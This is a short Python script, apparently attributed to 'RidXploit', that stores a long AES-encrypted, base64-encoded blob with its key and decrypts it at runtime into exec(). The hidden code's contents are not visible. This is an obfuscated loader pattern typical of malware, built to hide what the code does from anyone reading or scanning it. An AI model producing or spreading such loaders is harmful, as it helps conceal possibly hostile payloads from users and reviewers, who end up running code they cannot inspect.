# This file has been encrypted using AES and base64 by RidXploit

encrypted_code = "RidXploit_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_RidXploit"
key = bytes.fromhex("01dd0c114355e0bfc7a5d9f7cd8216fe16ca7297121cebc8bd30485c282a9719")


import base64
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad

def aes_decrypt(data, key):
    data = base64.b64decode(data.replace("RidXploit_", "").replace("_RidXploit", ""))
    iv = data[:16]
    ciphertext = data[16:]
    cipher = AES.new(key, AES.MODE_CBC, iv)
    decrypted = unpad(cipher.decrypt(ciphertext), AES.block_size)
    return decrypted

# Decrypt and execute the Python code
decrypted_code = aes_decrypt(encrypted_code, key)
exec(decrypted_code.decode('utf-8'))
